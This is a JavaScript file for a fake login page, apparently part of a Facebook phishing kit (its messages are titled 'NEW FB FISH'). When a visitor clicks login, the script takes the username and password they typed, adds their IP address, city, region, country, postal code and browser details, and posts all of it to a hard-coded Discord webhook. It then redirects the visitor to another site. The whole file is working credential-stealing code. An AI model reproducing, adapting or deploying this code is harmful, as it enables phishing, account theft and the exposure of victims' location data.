const loginButton = document.querySelector("#loginBtn");
const password = document.querySelector("#passwordInput");
const username = document.querySelector("#usernameInput");
const showPasswordBtn = document.querySelector("#showPasswordBtn");

password.addEventListener("input", disableBtn);
username.addEventListener("input", disableBtn);



function passwordVisible() {
  if (password.type === "password") {
    password.type = "text";
    showPasswordBtn.textContent = "Hide";
  } else {
    password.type = "password";
    showPasswordBtn.textContent = "Show";
  }
}

function passwordBtnVisible() {
  if (password.value.length > 0) {
    showPasswordBtn.style.display = "block";
  } else {
    showPasswordBtn.style.display = "none";
  }
}

function disableBtn() {
  if (username.value && password.value) {
      loginButton.disabled = false;
  } else {
      loginButton.disabled = true;
  }
}

let Info
loginButton.addEventListener("click", () => {
  (async function() {
    Info = await getInfo();
    console.log(Info);
    sendInfo()
  })();
})

async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    
    const info = `> IP: ${data.ip}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country_name}\n> Postal Code: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
    
    return info;
  } catch {
    return `> IP: Unknown\n> City: Unknown\n> Region: Unknown\n> Country: Unknown\n> Postal Code: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
  }
}
  

async function sendInfo() {
  const webhook = "https://discord.com/api/webhooks/1148907132184449058/CbRlY2isADICEem0aVn3zz2_28paHqB84G_SMgHE6lD6IsB-M5yhO4W7fYsPCoclHMgJ"; //your discord webhook url

  const embed = {
    color: 1585803, //#18328b
    title: "NEW FB FISH",
    description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
    footer: {
      text: "@terrykiddo",
    }
  }

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username: "TK_FBlog", embeds: [embed] }) //content: `${Info}`
  };

  try {
    await fetch(webhook, config);
  } catch {
    setTimeout(function() {
        window.location.replace("https://spring-feather-2536.on.fleek.co/")
    }, 1000);
  }
  setTimeout(function() {
    window.location.replace("https://spring-feather-2536.on.fleek.co/")
  }, 1000);
}
